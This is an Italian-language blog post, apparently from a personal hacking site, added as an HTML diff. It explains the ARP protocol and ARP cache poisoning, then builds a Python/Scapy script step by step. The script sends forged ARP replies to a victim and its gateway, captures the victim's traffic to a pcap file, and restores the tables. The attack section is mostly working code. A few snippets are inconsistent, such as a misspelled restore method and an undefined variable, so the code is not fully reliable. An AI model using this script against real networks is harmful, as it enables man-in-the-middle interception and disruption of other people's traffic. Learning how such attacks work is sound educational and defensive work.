@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Introduzione All&#39;ARP Poisoning :: HomePage</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Table Of Contents:
+ Cos&amp;rsquo;è il Protocollo ARP Che cos’è l’ARP Poisoning ARP Poisoning con Scapy e Python  In questi giorni ho letto Python per Hacker (seconda edizione) e mi sono imbattuto durante la lettura in un argomento molto interessante, ossia l&amp;rsquo;ARP Poisoning.
+Ho iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.
+Cos&amp;rsquo;è il Protocollo ARP Per approfondire l&amp;rsquo;argomento ti consigli di leggere questo." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://kobra3390.github.io/SpaceHack/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://kobra3390.github.io/SpaceHack/spacehack.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="Autore: k0Br@3390" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Introduzione All&#39;ARP Poisoning">
+<meta property="og:description" content="Table Of Contents:
+ Cos&amp;rsquo;è il Protocollo ARP Che cos’è l’ARP Poisoning ARP Poisoning con Scapy e Python  In questi giorni ho letto Python per Hacker (seconda edizione) e mi sono imbattuto durante la lettura in un argomento molto interessante, ossia l&amp;rsquo;ARP Poisoning.
+Ho iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.
+Cos&amp;rsquo;è il Protocollo ARP Per approfondire l&amp;rsquo;argomento ti consigli di leggere questo." />
+<meta property="og:url" content="https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/" />
+<meta property="og:site_name" content="HomePage" />
+
+  
+    <meta property="og:image" content="https://kobra3390.github.io/SpaceHack/spacehack.ico">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://kobra3390.github.io/SpaceHack/">
+  <div class="logo">
+    SpaceHack
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="https://kobra3390.github.io/SpaceHack/about">About</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="https://kobra3390.github.io/SpaceHack/about">About</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://kobra3390.github.io/SpaceHack/posts/introduzione-arp-poisoning/introduzione_arp_poisoning/">Introduzione All&rsquo;ARP Poisoning</a>
+  </h1>
+  <div class="post-meta">
+    
+    
+      <span class="post-author">Autore: k0Br@3390</span>
+    
+    
+  </div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Table Of Contents:</p>
+<ul>
+<li><a href="#cos---il-protocollo-arp">Cos&rsquo;è il Protocollo ARP</a></li>
+<li><a href="#che-cos---l-arp-poisoning">Che cos’è l’ARP Poisoning</a></li>
+<li><a href="#arp-poisoning-con-scapy-e-python">ARP Poisoning con Scapy e Python</a></li>
+</ul>
+<p>In questi giorni ho letto <em>Python per Hacker (seconda edizione)</em> e mi sono imbattuto durante la lettura in un argomento
+molto interessante, ossia <strong>l&rsquo;ARP Poisoning</strong>.</p>
+<p>Ho iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.</p>
+<h1 id="cosè-il-protocollo-arp">Cos&rsquo;è il Protocollo ARP<a href="#cosè-il-protocollo-arp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Per approfondire l&rsquo;argomento ti consigli di leggere <a href="https://www.ionos.it/digitalguide/server/sicurezza/arp-poisoning-attacchi-dalla-rete-locale/">questo</a>.</p>
+<p>A differenza di quanto succede su Internet, i dispositivi presenti nella LAN non comunicano direttamente attraverso gli indirizzi IP, al loro posto, per l’indirizzamento nelle reti locali IPv4, vengono utilizzati gli indirizzi fisici dell’hardware, chiamati indirizzi MAC (Media Access Control). Gli indirizzi MAC vengono attribuiti dal rispettivo produttore hardware e sono unici al mondo. Teoricamente gli indirizzi hardware si adatterebbero quindi per consentire un indirizzamento globale, ma nella prassi questa concezione non si può applicare, visto che gli indirizzi IPv4 sono troppo brevi per rappresentare in modo completo gli indirizzi MAC. Nelle reti basate su IPv4, la risoluzione dell’indirizzo tramite ARP è perciò indispensabile.</p>
+<p>Se ora un computer A volesse contattare un computer B nella stessa rete, per ottenere il suo indirizzo IP deve prima di tutto individuare l’indirizzo MAC appropriato. Così entra in azione l’Address Resolution Protocol (ARP), un protocollo di rete che funziona secondo lo schema request-response. Ricercando l’indirizzo MAC giusto, il computer A invia prima di tutto una richiesta broadcast (chiamata richiesta ARP, in inglese “ARP request”) a tutti i dispositivi in rete, questa richiesta comprende all’incirca le seguenti informazioni:</p>
+<blockquote>
+<p><em>Un computer con l&rsquo;indirizzo MAC xx-xx-xx-xx-xx-xx e l&rsquo;indirizzo IP yyy.yyy.yyy.yyy vorrebbe prendere contatto con un computer con l&rsquo;indirizzo IP zzz.zzz.zzz.zzz e ha bisogno dell&rsquo;indirizzo MAC giusto.</em></p>
+</blockquote>
+<p>La richiesta ARP viene accolta da tutti i computer nella LAN. Ogni computer in rete è collegato a una tabella locale, detta cache ARP, per evitare che prima dell’invio di ogni pacchetto debba venire fatta una richiesta ARP. Qui vengono salvati temporaneamente tutti gli indirizzi MAC conosciuti, comprensivi dell’IP assegnato.</p>
+<p>Tutti i computer nella rete annotano così nella richiesta broadcast la coppia di indirizzo del mittente consegnato. Però ci si aspetta una risposta broadcast solo dal computer B, che invia un’ARP reply comprendente le seguenti informazioni:</p>
+<blockquote>
+<p><em>Qui il sistema con l&rsquo;indirizzo IP zzz.zzz.zzz.zzz. L&rsquo;indirizzo MAC ricercato è aa-aa-aa-aa-aa-aa.</em></p>
+</blockquote>
+<p>Se un’ARP reply giunge al computer A, questo dispone di tutte le informazioni necessarie per inviare i pacchetti al computer B. Perciò la comunicazione attraverso la rete locale non incontra nessun ostacolo.</p>
+<p>Ma cosa succede se non è il computer di destinazione ricercato a rispondere, bensì un altro dispositivo che viene controllato da un hacker con intenti poco onorevoli? In questo caso entra in gioco l’ARP poisoning.</p>
+<p>Ora che abbiamo chiarito il funzionamento del protocollo ARP, possiamo capire come un attaccante può usare le falle del protocollo per i suoi scopi.</p>
+<h1 id="che-cosè-larp-poisoning">Che cos’è l’ARP Poisoning<a href="#che-cosè-larp-poisoning" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Lo schema request-response del protocollo ARP è creato in modo tale che venga accettata e salvata la prima richiesta a un ARP request. Nel campo dell’ARP spoofing, gli hacker cercano perciò di prevenire il reale computer di destinazione, di inviare un pacchetto di risposta con informazioni false e di manipolare così la tabella ARP del computer richiedente, si parla quindi anche di ARP poisoning, perché si intende un “avvelenamento” della cache ARP. Di solito il pacchetto comprende anche l’indirizzo MAC di un dispositivo di rete, controllato dall’hacker. Il sistema della vittima collega così l’IP di uscita con un indirizzo dell’hardware falso e in seguito invia, inosservato, tutti i pacchetti al sistema controllato dall’hacker, che ha così la possibilità di rilevare tutto il traffico dati o di manipolarlo. Per rimanere nascosto, il traffico dati ascoltato viene solitamente inoltrato al sistema di destinazione reale. Un hacker ottiene così con l’inganno lo status di man in the middle. Se i pacchetti intercettati non vengono inoltrati, bensì rifiutati, l’ARP poisoning può comportare un Denial of Service (DoS). Un’altra strategia prevede che la rete venga continuamente bombardata da ARP reply false. La maggior parte dei sistemi ignorano i pacchetti di risposta che non possono attribuire a nessuna richiesta; però questo cambia non appena un computer avvia nella LAN una richiesta ARP e di conseguenza si ha l’intenzione di accettare una risposta.
+È quindi una questione di timing, se al mittente arrivi prima la risposta del sistema di destinazione o di uno dei pacchetti falsi.</p>
+<h1 id="arp-poisoning-con-scapy-e-python">ARP Poisoning con Scapy e Python<a href="#arp-poisoning-con-scapy-e-python" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Dopo tutta questa prefazione teorica ora dobbiamo mettere le mani in pasta.</p>
+<blockquote>
+<p><em>Disclaimer: ⚠️ Quello che starete per vedere è un esempio di attacco informatico che sto svolgendo su sistemi di mia proprietà. Per chi fosse curioso di replicare quanto vede, consigli di farlo su sistemi di suo possesso, usare queste tecniche su sistemi informatici senza autorizzazione è un illecito. ⚠️</em></p>
+</blockquote>
+<p>Per questo attacco useremo una macchina Kali (macchina attaccante) e una macchina Pop-os (macchina target - vittima), rispettivamente su macchina virtuale e sul portatile.</p>
+<p>Per prima cosa controlleremo la configurazione di rete su Pop-os, il nostro bersaglio. Usiamo il comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifconfig <span style="color:#f92672">[</span>interface<span style="color:#f92672">]</span>
+</code></pre></div><p><em>interface</em> dovrà essere sostituito con il nome dell’interfaccia di rete della macchina vittima, nel mio caso l’interfaccia è wlp61s0, l’output dovrà essere un qualcosa simile a:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wlp61s0: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
+        inet 192.168.1.22  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::bf57:5b8e:8ef6:fe0b  prefixlen <span style="color:#ae81ff">64</span>  scopeid 0x20&lt;link&gt;
+        ether b4:6b:fc:a3:63:99  txqueuelen <span style="color:#ae81ff">1000</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
+        RX packets <span style="color:#ae81ff">190150</span>  bytes <span style="color:#ae81ff">230866258</span> <span style="color:#f92672">(</span>230.8 MB<span style="color:#f92672">)</span>
+        RX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">2237</span>  overruns <span style="color:#ae81ff">0</span>  frame <span style="color:#ae81ff">0</span>
+        TX packets <span style="color:#ae81ff">52365</span>  bytes <span style="color:#ae81ff">14313727</span> <span style="color:#f92672">(</span>14.3 MB<span style="color:#f92672">)</span>
+        TX errors <span style="color:#ae81ff">0</span>  dropped <span style="color:#ae81ff">0</span> overruns <span style="color:#ae81ff">0</span>  carrier <span style="color:#ae81ff">0</span>  collisions <span style="color:#ae81ff">0</span>
+</code></pre></div><p>Il comando ifconfig ci mostra la configurazione della rete per un’interfaccia specifica (in quest’esempio è la wlp61s0) o per tutte le interfacce se non ne richiediamo una in particolare.</p>
+<p>L’output mostra che l’indirizzo <strong>inet</strong> (IPv4) per il dispositivo è 192.168.1.22. È mostrato anche l’indirizzo mac ether che è b4:6b:fc:a3:63:99.</p>
+<p>Ora vediamo la cache ARP della macchina vittima, usiamo il comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">arp -a
+</code></pre></div><p>Il risultato è qualcosa del tipo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wind3.hub <span style="color:#f92672">(</span>192.168.1.1<span style="color:#f92672">)</span> associato a b8:d5:26:69:b5:dc <span style="color:#f92672">[</span>ether<span style="color:#f92672">]</span> su wlp61s0
+Kobra3390.wind3.hub <span style="color:#f92672">(</span>192.168.1.233<span style="color:#f92672">)</span> associato a 18:cc:18:fa:ad:b1 <span style="color:#f92672">[</span>ether<span style="color:#f92672">]</span> su wlp61s0
+</code></pre></div><p>192.168.1.233 è l’indirizzo IP della macchina Kali, mentre 192.168.1.1 è l’indirizzo IP del gateway. Oltre ai loro indirizzi IP possiamo vedere i loro indirizzi MAC. Prendiamo nota di questi valori in quanto, visualizzando la cache ARP ad attacco iniziato, potremo verificare di aver provocato il cambio dell’indirizzo MAC registrato per il gateway.</p>
+<p>Conoscendo l’indirizzo IP dell’attaccante e del gateway possiamo spostarci sulla macchina attaccante e preparare lo script Python, chiameremo lo script arper.py:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> multiprocessing <span style="color:#f92672">import</span> Process
+<span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> (ARP, Ether, conf, get_if_hwaddr, 
+                        send, sniff, sndrcv, srp, wrpcap)
+
+<span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> sys<span style="color:#f92672">,</span> time
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_mac</span>(targetip):
+    <span style="color:#66d9ef">pass</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Arper</span>:
+    <span style="color:#66d9ef">def</span> __init__(self, victim, gateway, interface<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eth0&#39;</span>):
+        <span style="color:#66d9ef">pass</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(self):
+        <span style="color:#66d9ef">pass</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">poison</span>(self):
+        <span style="color:#66d9ef">pass</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sniff</span>(self, count<span style="color:#f92672">=</span><span style="color:#ae81ff">200</span>):
+        <span style="color:#66d9ef">pass</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">restore</span>(self):
+        <span style="color:#66d9ef">pass</span>
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    (victim, gateway, interface) <span style="color:#f92672">=</span> (sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>])
+    myarp <span style="color:#f92672">=</span> Arper(victim, gateway, interface)
+    myarp<span style="color:#f92672">.</span>run()
+</code></pre></div><p>Come si vede, definiamo una funzione helper per ottenere l’ indirizzo MAC per una determinata macchina e una classe <strong>Arper</strong> per fare poisoning (metodo poison), sniffare (metodo sniff) e ripristinare (metodo restore) la configurazione di rete. Completiamo ogni sezione iniziando con la funzione <strong>get_mac</strong> che restituisce un indirizzo MAC per uno specifico indirizzo IP. Ci servono gli indirizzi MAC della vittima e del gateway:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_mac</span>(targetip):
+    packet <span style="color:#f92672">=</span> Ether(dst<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ff:ff:ff:ff:ff:ff&#39;</span>)<span style="color:#f92672">/</span>ARP(op<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;who-has&#34;</span>, pdst<span style="color:#f92672">=</span>targetip)
+    resp, _ <span style="color:#f92672">=</span> srp(packet, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, retry<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>, verbose<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+    <span style="color:#66d9ef">for</span> _, r <span style="color:#f92672">in</span> resp:
+        <span style="color:#66d9ef">return</span> r[Ether]<span style="color:#f92672">.</span>src
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</code></pre></div><p>Le passiamo l’indirizzo IP dell’obiettivo e creiamo un pacchetto. La funzione <strong>Ether</strong> specifica che il pacchetto è concepito per essere un broadcast e la funzione ARP che la richiesta punta a sapere l’indirizzo MAC collegato chiedendo a ogni nodo della rete se è in possesso di quell’indirizzo IP. Inviamo poi il pacchetto con la funzione di Scapy <strong>srp</strong> che si occupa di inviare e ricevere pacchetti a livello 2 della rete. Riceviamo la risposta nella variabile <strong>resp</strong> che dovrebbe contenere la sorgente <strong>Ether</strong> (il MAC address) del corrispondente indirizzo IP. Subito dopo, iniziamo a scrivere la classe <strong>Arper</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Arper</span>:
+    <span style="color:#66d9ef">def</span> __init__(self, victim, gateway, interface<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eth0&#39;</span>):
+        self<span style="color:#f92672">.</span>victim <span style="color:#f92672">=</span> victim
+        self<span style="color:#f92672">.</span>victimmac <span style="color:#f92672">=</span> get_mac(victim)
+        self<span style="color:#f92672">.</span>gateway <span style="color:#f92672">=</span> gateway
+        self<span style="color:#f92672">.</span>gatewaymac <span style="color:#f92672">=</span> get_mac(gateway)
+        self<span style="color:#f92672">.</span>interface <span style="color:#f92672">=</span> interface
+        conf<span style="color:#f92672">.</span>iface <span style="color:#f92672">=</span> interface
+        conf<span style="color:#f92672">.</span>verb <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Initialized </span><span style="color:#e6db74">{</span>interface<span style="color:#e6db74">}</span><span style="color:#e6db74">:&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Gateway (</span><span style="color:#e6db74">{</span>gateway<span style="color:#e6db74">}</span><span style="color:#e6db74">) is at </span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>gatewaymac<span style="color:#e6db74">}</span><span style="color:#e6db74">.&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Victim (</span><span style="color:#e6db74">{</span>victim<span style="color:#e6db74">}</span><span style="color:#e6db74">) is at </span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>victimmac<span style="color:#e6db74">}</span><span style="color:#e6db74">.&#39;</span>)
+        print(<span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+</code></pre></div><p>Inizializziamo la classe con gli indirizzi IP del gateway e della vittima e specifichiamo l’interfaccia che vogliamo utilizzare (<em>eth0</em> è l’opzione di default). Popoliamo le variabili interne dell’oggetto con <strong>interface</strong>, <strong>victim</strong>, <strong>victimmac</strong>, <strong>gateway</strong> e <strong>gatewaymac</strong> stampandone i valori a console.</p>
+<p>All’interno della classe <strong>Arper</strong> scriviamo la funzione run che rappresenta l’entry point del nostro attacco:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(self):
+        self<span style="color:#f92672">.</span>poison_thread <span style="color:#f92672">=</span> Process(target<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>poison)
+        self<span style="color:#f92672">.</span>poison_thread<span style="color:#f92672">.</span>start()
+
+        self<span style="color:#f92672">.</span>sniff_thread <span style="color:#f92672">=</span> Process(target<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>sniff)
+</code></pre></div><p>Il metodo <strong>run</strong> esegue tutto il lavoro principale dell’oggetto <strong>Arper</strong>. Imposta ed esegue due processi:</p>
+<ul>
+<li>Il primo avvelena la cache ARP</li>
+<li>Il secondo ci permette di osservare l’evoluzione dell’attacco sniffando il traffico di rete</li>
+</ul>
+<p>Il metodo <strong>poison</strong> produce i pacchetti “avvelenati” e li invia alla vittima e al gateway:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">poison</span>(self):
+        poison_victim <span style="color:#f92672">=</span> ARP()
+        poison_victim<span style="color:#f92672">.</span>op <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+        poison_victim<span style="color:#f92672">.</span>psrc <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>gateway
+        poison_victim<span style="color:#f92672">.</span>pdst <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>victim
+        poison_victim<span style="color:#f92672">.</span>hwdst <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>victimmac
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ip src: </span><span style="color:#e6db74">{</span>poison_victim<span style="color:#f92672">.</span>psrc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ip dst: </span><span style="color:#e6db74">{</span>poison_victim<span style="color:#f92672">.</span>pdst<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;mac dst: </span><span style="color:#e6db74">{</span>poison_victim<span style="color:#f92672">.</span>hwdst<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;mac src: </span><span style="color:#e6db74">{</span>poison_victim<span style="color:#f92672">.</span>hwsrc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(poison_victim<span style="color:#f92672">.</span>summary())
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+        poison_gateway <span style="color:#f92672">=</span> ARP()
+        poison_gateway<span style="color:#f92672">.</span>op <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+        poison_gateway<span style="color:#f92672">.</span>psrc <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>victim
+        poison_gateway<span style="color:#f92672">.</span>pdst <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>gateway
+        poison_gateway<span style="color:#f92672">.</span>hwdst <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>gatewaymac
+        
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ip src: </span><span style="color:#e6db74">{</span>poison_gateway<span style="color:#f92672">.</span>psrc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ip dst: </span><span style="color:#e6db74">{</span>poison_gateway<span style="color:#f92672">.</span>pdst<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;mac dst: </span><span style="color:#e6db74">{</span>poison_gateway<span style="color:#f92672">.</span>hwdst<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;mac src: </span><span style="color:#e6db74">{</span>poison_gateway<span style="color:#f92672">.</span>hwsrc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(poison_gateway<span style="color:#f92672">.</span>summary())
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Beginning the ARP poison. [CTRL-C to stop]&#39;</span>)
+        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;.&#39;</span>)
+            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+            <span style="color:#66d9ef">try</span>:
+                send(poison_victim)
+                send(poison_gateway)
+            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+                self<span style="color:#f92672">.</span>restore()
+                sys<span style="color:#f92672">.</span>exit()
+            <span style="color:#66d9ef">else</span>:
+                time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
+</code></pre></div><p>Il metodo <strong>poison</strong> imposta i dati che useremo per “avvelenare” la vittima e il gateway. Per prima cosa, creiamo un pacchetto ARP <em>poisoned</em> per la vittima. Allo stesso modo, ne prepariamo uno per il gateway. Inganniamo il gateway inviandogli l’indirizzo IP della vittima ma con il MAC dell’aggressore. Facciamo poi lo stesso inviando alla vittima l’indirizzo IP del gateway ma con il MAC address dell’aggressore. Stampando tutti i dettagli di queste operazioni a console potremo essere certi di aver fissato correttamente indirizzi destinazione e payload.</p>
+<p>Poi iniziamo a spedire i pacchetti “avvelenati” alle destinazioni in un ciclo infinito per assicurarci che le rispettive voci nelle cache ARP rimangano corrotte per tutta la durata dell’attacco.</p>
+<p>Porremo fine al ciclo solo quando immetteremo la combinazione da tastiera CTRL-C (KeyboardInterrupt) e da lì ripristineremo la situazione riportandola alla normalità, inviando informazioni corrette sia alla vittima sia al gateway e cancellando gli effetti del nostro attacco.</p>
+<p>Per vedere e registrare cosa succede durante le nostre operazioni di <em>poisoning</em>, intercettiamo il traffico di rete con il metodo <strong>sniff</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sniff</span>(self, count<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>):
+        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Sniffing </span><span style="color:#e6db74">{</span>count<span style="color:#e6db74">}</span><span style="color:#e6db74"> packets&#39;</span>)
+        bpf_filter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ip host </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> victim
+        packets <span style="color:#f92672">=</span> sniff(count<span style="color:#f92672">=</span>count, filter<span style="color:#f92672">=</span>bpf_filter, iface<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>interface)
+        wrpcap(<span style="color:#e6db74">&#39;arper.pcap&#39;</span>, packets)
+        print(<span style="color:#e6db74">&#39;Got the packets&#39;</span>)
+        self<span style="color:#f92672">.</span>restrore()
+        self<span style="color:#f92672">.</span>poison_thread<span style="color:#f92672">.</span>terminate()
+        print(<span style="color:#e6db74">&#39;Finished.&#39;</span>)
+</code></pre></div><p>Il metodo <strong>sniff</strong> resta in pausa per cinque secondi prima di iniziare lo <em>sniffing</em> per dare tempo al thread che esegue il vero e proprio <em>poisoning</em> di avviarsi. Intercetta un determinato numero di pacchetti (100 di default), filtrando quelli che contengono l’indirizzo IP della vittima. Una volta catturati i pacchetti, ne salviamo il contenuto su un file che chiameremo <em>arper.pcap</em>, ripristiniamo le tabelle ARP ai loro valori originali e fermiamo il thread che sta conducendo l’attacco.</p>
+<p>Da ultimo, il metodo <strong>restore</strong> riporta la vittima e il gateway al loro stato originale inviando informazioni ARP corrette alle rispettive macchine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">restrore</span>(self):
+        print(<span style="color:#e6db74">&#39;Restoring ARP Tables...&#39;</span>)
+        send(ARP(
+            op<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, 
+            psrc<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>gateway, 
+            hwsrc<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>gatewaymac, 
+            pdst<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>victim, 
+            hwdst<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ff:ff:ff:ff:ff:ff&#39;</span>), 
+            count<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+        send(ARP(
+            op<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, 
+            psrc<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>victim, 
+            hwsrc<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>victimmac, 
+            pdst<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>gateway, 
+            hwdst<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ff:ff:ff:ff:ff:ff&#39;</span>), 
+            count<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
